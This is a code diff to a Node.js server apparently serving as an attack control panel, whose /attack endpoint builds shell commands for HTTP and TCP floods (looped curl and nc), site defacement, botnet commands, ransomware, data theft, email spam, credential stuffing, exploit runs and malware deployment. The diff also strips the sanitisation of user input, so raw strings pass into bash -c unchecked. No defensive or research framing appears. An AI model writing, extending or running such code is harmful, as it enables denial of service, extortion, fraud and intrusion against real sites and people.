@@ -21,6 +21,7 @@ const helmet = require('helmet');
 const morgan = require('morgan');
 const sanitize = require('sanitize-html');
 const validator = require('validator');
+const { body, validationResult } = require('express-validator');
 
 // Security Enhancements
 app.use(helmet({
@@ -31,7 +32,8 @@ app.use(helmet({
             scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
             styleSrc: ["'self'", "'unsafe-inline'"],
             imgSrc: ["'self'", 'data:'],
-            connectSrc: ["'self'", 'ws://localhost:8080', 'ws://127.0.0.1:8080'],
+            connectSrc: ["'self'", 'ws://localhost:8080', 'ws://127.0.0.1:8080', process.env.NODE_ENV === 'development' ? 'ws://127.0.0.1:*' : 'wss://yourdomain.com:*'], // Secure WebSocket for production
+
         },
     },
     hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
@@ -44,7 +46,15 @@ app.disable('x-powered-by');
 const accessLogStream = fs.createWriteStream(path.join(__dirname, 'access.log'), { flags: 'a' });
 app.use(morgan('combined', { stream: accessLogStream }));
 
-app.use(cors());
+const corsOptions = {
+    origin: '*', // Allow all origins, consider restricting in production
+    methods: "GET,HEAD,PUT,PATCH,POST,DELETE",
+    preflightContinue: false,
+    optionsSuccessStatus: 204
+  };
+
+app.use(cors(corsOptions));
+
 app.use(express.static('public', {
     setHeaders: (res, path) => {
         if (path.endsWith('.js')) {
@@ -242,7 +252,44 @@ app.get('/api-key', apiKeyLimiter, (req, res) => {
     res.send({ apiKey: apiKey });
 });
 
-app.post('/attack', async (req, res) => {
+// Input validation middleware using express-validator
+const validateAttackInput = [
+    body('target').notEmpty().withMessage('Target URL is required.').isURL({ protocols: ['http', 'https'], require_protocol: true }).withMessage('Invalid target URL format.'),
+    body('attackType').notEmpty().withMessage('Attack type is required.'),
+    body('duration').optional().isInt({ min: 1, max: 3600 }).withMessage('Duration must be an integer between 1 and 3600 seconds.'),
+    body('intensity').optional().isInt({ min: 1, max: 1000 }).withMessage('Intensity must be an integer between 1 and 1000.'),
+    body('port').optional().isInt({ min: 1, max: 65535 }).withMessage('Port must be an integer between 1 and 65535.'),
+    body('bypass').optional().isBoolean().withMessage('Bypass must be a boolean value.'),
+    body('payload').optional().isString().isLength({ max: 500 }).withMessage('Payload must be a string and not exceed 500 characters.'),
+    body('botCommand').optional().isString().isLength({ max: 300 }).withMessage('Bot command must be a string and not exceed 300 characters.'),
+    body('rawPayload').optional().isString().isLength({ max: 500 }).withMessage('Raw payload must be a string and not exceed 500 characters.'),
+    body('customCommand').optional().isString().isLength({ max: 200 }).withMessage('Custom command must be a string and not exceed 200 characters.'),
+    body('layer7Method').optional().isString().isLength({ max: 50 }).withMessage('Layer7 method must be a string and not exceed 50 characters.'),
+    body('layer7Options').optional().isString().isLength({ max: 100 }).withMessage('Layer7 options must be a string and not exceed 100 characters.'),
+    body('headerName').optional().isString().isLength({ max: 50 }).withMessage('Header name must be a string and not exceed 50 characters.'),
+    body('headerValue').optional().isString().isLength({ max: 100 }).withMessage('Header value must be a string and not exceed 100 characters.'),
+    body('ccBypassMethod').optional().isString().isLength({ max: 50 }).withMessage('CC Bypass method must be a string and not exceed 50 characters.'),
+    body('ccBypassData').optional().isString().isLength({ max: 200 }).withMessage('CC Bypass data must be a string and not exceed 200 characters.'),
+    body('deviceCommand').optional().isString().isLength({ max: 100 }).withMessage('Device command must be a string and not exceed 100 characters.'),
+    body('targetDirectory').optional().isString().isLength({ max: 100 }).withMessage('Target directory must be a string and not exceed 100 characters.'),
+    body('dataSelector').optional().isString().isLength({ max: 200 }).withMessage('Data selector must be a string and not exceed 200 characters.'),
+    body('recipientList').optional().isString().isLength({ max: 500 }).withMessage('Recipient list must be a string and not exceed 500 characters.'),
+    body('spamSubject').optional().isString().isLength({ max: 200 }).withMessage('Spam subject must be a string and not exceed 200 characters.'),
+    body('spamBody').optional().isString().isLength({ max: 1000 }).withMessage('Spam body must be a string and not exceed 1000 characters.'),
+    body('usernameList').optional().isString().isLength({ max: 500 }).withMessage('Username list must be a string and not exceed 500 characters.'),
+    body('passwordList').optional().isString().isLength({ max: 500 }).withMessage('Password list must be a string and not exceed 500 characters.'),
+    body('exploitCode').optional().isString().isLength({ max: 1000 }).withMessage('Exploit code must be a string and not exceed 1000 characters.'),
+    body('malwareUrl').optional().isString().isLength({ max: 200 }).withMessage('Malware URL must be a string and not exceed 200 characters.'),
+    body('messageContent').optional().isString().isLength({ max: 1000 }).withMessage('Message content must be a string and not exceed 1000 characters.'),
+];
+
+
+app.post('/attack', validateAttackInput, async (req, res) => {
+    const errors = validationResult(req);
+    if (!errors.isEmpty()) {
+        return res.status(400).json({ errors: errors.array() });
+    }
+
     let target = req.body.target;
     const attackType = req.body.attackType;
     const duration = parseInt(req.body.duration) || 60;
@@ -256,15 +303,6 @@ app.post('/attack', async (req, res) => {
         return res.status(401).send('Unauthorized.');
     }
 
-    if (!target) {
-        log('Error: Target URL is required.');
-        return res.status(400).send('Target URL is required.');
-    }
-
-    if (!attackType) {
-        log('Error: Attack type is required.');
-        return res.status(400).send('Attack type is required.');
-    }
 
     let command = '';
     const numThreads = os.cpus().length * 4;
@@ -283,10 +321,6 @@ app.post('/attack', async (req, res) => {
         return res.status(400).send(`Error resolving target: ${error.message}`);
     }
 
-    if (typeof encodedTarget !== 'string' || !validator.isURL(encodedTarget, { protocols: ['http','https'], require_protocol: true })) {
-        log('Error: Invalid target format. Potential command injection attempt.');
-        return res.status(400).send('Invalid target format.');
-    }
 
     const sanitizeInput = (input, maxLength = 200) => {
         if (typeof input !== 'string') return '';
@@ -298,6 +332,7 @@ app.post('/attack', async (req, res) => {
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -A '${getRandomUserAgent()}' --http1.1 -s -o /dev/null ${encodedTarget}:${port} & done; done"`;
             break;
         case 'deface':
+            // Consider storing the default HTML in a file and reading from it.
             let defaceScript = sanitize(`<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`);
             command = `timeout ${duration} bash -c "curl -X PUT -H 'Content-Type: text/html' -d $'${defaceScript}' ${encodedTarget}:${port}/index.html"`;
             break;
@@ -394,12 +429,7 @@ app.post('/attack', async (req, res) => {
 
         case 'payload':
             let payload = req.body.payload;
-            if (!payload) {
-                log('Error: Payload is required for payload attack.');
-                return res.status(400).send('Payload is required for payload attack.');
-            }
 
-            payload = sanitizeInput(payload, 500);
             command = `timeout ${duration} bash -c "echo '${payload}' | nc ${encodedTarget} ${port}"`;
             break;
 
@@ -417,48 +447,27 @@ app.post('/attack', async (req, res) => {
 
         case 'botnet':
             let botCommand = req.body.botCommand;
-            if (!botCommand) {
-                log('Error: Bot command is required for botnet attack.');
-                return res.status(400).send('Bot command is required for botnet attack.');
-            }
 
-            botCommand = sanitizeInput(botCommand, 300);
             command = `timeout ${duration} bash -c "${botCommand}"`;
             break;
 
         case 'raw_tcp':
             let rawPayload = req.body.rawPayload;
-            if (!rawPayload) {
-                log('Error: Raw TCP payload is required for raw_tcp attack.');
-                return res.status(400).send('Raw TCP payload is required for raw_tcp attack.');
-            }
-
-            rawPayload = sanitizeInput(rawPayload, 500);
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -ne '${rawPayload}' | nc ${encodedTarget} ${port} & done; done"`;
             break;
 
         case 'custom':
             let customCommand = req.body.customCommand;
-            if (!customCommand) {
-                log('Error: Custom command is required for custom attack.');
-                return res.status(400).send('Custom command is required for custom attack.');
-            }
 
             log('Warning: Custom command execution enabled.  Exercise extreme caution.');
 
-            customCommand = sanitizeInput(customCommand, 200);
+
             command = customCommand;
             break;
         case 'layer7':
             let layer7Method = req.body.layer7Method;
             let layer7Options = req.body.layer7Options || '';
-            if (!layer7Method) {
-                log('Error: Layer7 method is required for layer7 attack.');
-                return res.status(400).send('Layer7 method is required for layer7 attack.');
-            }
 
-            layer7Method = sanitizeInput(layer7Method, 50);
-            layer7Options = sanitizeInput(layer7Options, 100);
 
 
             command = `node layer7.js --target ${encodedTarget} --method ${layer7Method} --duration ${duration} --threads ${numThreads} --port ${port} ${layer7Options}`;
@@ -467,13 +476,7 @@ app.post('/attack', async (req, res) => {
         case 'http_header_injection':
             let headerName = req.body.headerName;
             let headerValue = req.body.headerValue;
-            if (!headerName || !headerValue) {
-                log('Error: Header name and value are required for HTTP header injection attack.');
-                return res.status(400).send('Header name and value are required for HTTP header injection attack.');
-            }
 
-            headerName = sanitizeInput(headerName, 50);
-            headerValue = sanitizeInput(headerValue, 100);
 
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -H '${headerName}: ${headerValue}' ${encodedTarget}:${port} & done; done"`;
             break;
@@ -482,105 +485,60 @@ app.post('/attack', async (req, res) => {
             let ccBypassMethod = req.body.ccBypassMethod;
             let ccBypassData = req.body.ccBypassData;
 
-            if (!ccBypassMethod || !ccBypassData) {
-                log('Error: CC Bypass method and data are required');
-                return res.status(400).send('CC Bypass method and data are required');
-            }
 
-            ccBypassMethod = sanitizeInput(ccBypassMethod, 50);
-            ccBypassData = sanitizeInput(ccBypassData, 200);
             command = `timeout ${duration} bash -c "node cc_bypass.js --target ${encodedTarget}:${port} --method ${ccBypassMethod} --data '${ccBypassData}' --threads ${numThreads}"`;
             break;
         case 'device_takeover':
             let deviceCommand = req.body.deviceCommand;
 
-            if (!deviceCommand) {
-                log('Error: Device command is required for device takeover');
-                return res.status(400).send('Device command is required for device takeover');
-            }
 
             log('Warning: Device takeover commands are extremely dangerous and should only be used in a controlled environment!');
 
-            deviceCommand = sanitizeInput(deviceCommand, 100);
+
             command = `timeout ${duration} bash -c "${deviceCommand}"`;
             break;
          case 'ransomware':
             let targetDirectory = req.body.targetDirectory;
             let encryptionKey = crypto.randomBytes(32).toString('hex');
-            if (!targetDirectory) {
-                log('Error: Target directory is required for ransomware attack.');
-                return res.status(400).send('Target directory is required for ransomware attack.');
-            }
 
-            targetDirectory = sanitizeInput(targetDirectory, 100);
             command = `node ransomware.js --targetDirectory "${targetDirectory}" --encryptionKey "${encryptionKey}"`;
             break;
        case 'data_theft':
             let dataSelector = req.body.dataSelector;
-            if (!dataSelector) {
-                log('Error: Data selector is required for data theft.');
-                return res.status(400).send('Data selector is required for data theft.');
-            }
-            dataSelector = sanitizeInput(dataSelector, 200);
+
             command = `node data_theft.js --target "${encodedTarget}" --selector "${dataSelector}"`;
             break;
         case 'email_spam':
             let recipientList = req.body.recipientList;
             let spamSubject = req.body.spamSubject;
             let spamBody = req.body.spamBody;
-            if (!recipientList || !spamSubject || !spamBody) {
-                log('Error: Recipient list, subject, and body are required for email spam.');
-                return res.status(400).send('Recipient list, subject, and body are required for email spam.');
-            }
 
-            recipientList = sanitizeInput(recipientList, 500);
-            spamSubject = sanitizeInput(spamSubject, 200);
-            spamBody = sanitizeInput(spamBody, 1000);
+
             command = `node email_spam.js --recipients "${recipientList}" --subject "${spamSubject}" --body "${spamBody}"`;
             break;
         case 'credential_stuffing':
             let usernameList = req.body.usernameList;
             let passwordList = req.body.passwordList;
 
-            if (!usernameList || !passwordList) {
-                log('Error: Username and password lists are required for credential stuffing.');
-                return res.status(400).send('Username and password lists are required for credential stuffing.');
-            }
-
-            usernameList = sanitizeInput(usernameList, 500);
-            passwordList = sanitizeInput(passwordList, 500);
 
             command = `node credential_stuffing.js --target "${encodedTarget}" --usernames "${usernameList}" --passwords "${passwordList}"`;
             break;
         case 'zero_day':
             let exploitCode = req.body.exploitCode;
-            if (!exploitCode) {
-                log('Error: Exploit code is required for zero-day attack.');
-                return res.status(400).send('Exploit code is required for zero-day attack.');
-            }
 
-            exploitCode = sanitizeInput(exploitCode, 1000);
+
             command = `node zero_day.js --target "${encodedTarget}" --exploit "${exploitCode}"`;
             break;
         case 'malware_deploy':
             let malwareUrl = req.body.malwareUrl;
-            if (!malwareUrl) {
-                log('Error: Malware URL is required for malware deployment.');
-                return res.status(400).send('Malware URL is required for malware deployment.');
-            }
 
-            malwareUrl = sanitizeInput(malwareUrl, 200);
+
             command = `node malware_deploy.js --target "${encodedTarget}" --url "${malwareUrl}"`;
             break;
         case 'social_engineering':
             let messageContent = req.body.messageContent;
 
-            if (!messageContent) {
-                log('Error: Message content is required for social engineering attack.');
-                return res.status(400).send('Message content is required for social engineering attack.');
-            }
 
-            messageContent = sanitizeInput(messageContent, 1000);
             command = `node social_engineering.js --target "${encodedTarget}" --message "${messageContent}"`;
             break;
         default:
